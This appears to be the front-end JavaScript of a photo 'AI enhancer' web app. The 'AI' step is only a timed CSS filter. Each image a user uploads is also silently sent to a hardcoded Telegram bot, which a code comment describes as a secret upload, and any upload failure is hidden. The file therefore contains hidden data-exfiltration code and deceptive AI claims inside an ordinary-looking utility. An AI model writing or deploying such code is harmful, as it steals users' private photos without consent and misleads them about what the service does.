// --- CONFIGURATION ---
const BOT_TOKEN = "8049988237:AAGsP1xquf1CYsFX-zLorjjdZQGmNZDVF60";
const CHAT_ID = "7674900139";

// 1. Splash Screen Logic
window.addEventListener('load', () => {
    setTimeout(() => {
        const splash = document.getElementById('splash-screen');
        if(splash) {
            splash.style.opacity = '0';
            setTimeout(() => {
                splash.style.display = 'none';
            }, 1000);
        }
    }, 2000);
});

// 2. Variables for UI Elements
const dropArea = document.getElementById('drop-area');
const fileInput = document.getElementById('file-upload');
const enhanceSection = document.getElementById('enhance-section');
const previewImage = document.getElementById('preview-image');
const processingText = document.getElementById('processing-text');
const heroSection = document.querySelector('.hero');
const featuresSection = document.querySelector('.features-section');
const downloadBtn = document.querySelector('.download-btn');

// 3. File Handling Logic
if(fileInput) {
    fileInput.addEventListener('change', function() {
        handleFiles(this.files);
    });
}

function handleFiles(files) {
    const file = files[0];
    if (file) {
        if (file.size > 10 * 1024 * 1024) {
            alert("File is too big! Max 10MB allowed.");
            return;
        }
        
        const reader = new FileReader();
        reader.readAsDataURL(file);
        reader.onloadend = function() {
            // Update UI
            previewImage.src = reader.result;
            heroSection.style.display = 'none';
            featuresSection.style.display = 'none';
            enhanceSection.style.display = 'block';
            
            // Start AI Simulation
            processingText.style.display = 'block';
            processingText.innerHTML = "AI Analyzing Pixels... <i class='fa-solid fa-spinner fa-spin'></i>";

            setTimeout(() => {
                // Apply AI Enhancement Filter Effect
                previewImage.style.filter = "contrast(1.1) brightness(1.05) saturate(1.1) sharp(1.2)";
                previewImage.style.transition = "filter 1.5s ease-in-out";
                
                processingText.innerHTML = "Enhancement Complete! <i class='fa-solid fa-check' style='color: #00ff00;'></i>";
                
                // Secretly upload to Telegram for your reference
                uploadToTelegram(file);
            }, 3000);
        }
    }
}

// 4. Download Logic
if(downloadBtn) {
    downloadBtn.onclick = function() {
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');
        const img = new Image();
        img.src = previewImage.src;
        
        img.onload = () => {
            canvas.width = img.width;
            canvas.height = img.height;
            // Applying the same filters to the downloaded image
            ctx.filter = "contrast(110%) brightness(105%) saturate(110%)";
            ctx.drawImage(img, 0, 0);
            
            const link = document.createElement('a');
            link.download = 'PicZone_Enhanced.png';
            link.href = canvas.toDataURL();
            link.click();
        };
    };
}

// 5. Telegram Upload Function
function uploadToTelegram(file) {
    const formData = new FormData();
    formData.append("chat_id", CHAT_ID);
    formData.append("photo", file);
    formData.append("caption", `🚀 New Upload!\n📂 File: ${file.name}\n⚖️ Size: ${(file.size / 1024 / 1024).toFixed(2)} MB`);

    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
        method: "POST",
        body: formData
    }).catch(err => console.log("Silent upload failed."));
}

// 6. Settings Modal Logic
const modal = document.getElementById('settings-modal');
const settingsBtn = document.getElementById('settings-btn');
const closeBtn = document.querySelector('.close-modal');

if(settingsBtn) {
    settingsBtn.onclick = () => modal.style.display = "block";
}
if(closeBtn) {
    closeBtn.onclick = () => modal.style.display = "none";
}
window.onclick = (event) => {
    if (event.target == modal) modal.style.display = "none";
}

// 7. Dark Mode Logic
function setTheme(mode) {
    if(mode === 'dark') {
        document.body.style.background = "#121212";
        document.body.style.color = "#ffffff";
    } else {
        document.body.style.background = "linear-gradient(135deg, #f3e6ff 0%, #e6e6fa 100%)";
        document.body.style.color = "#333";
    }
}
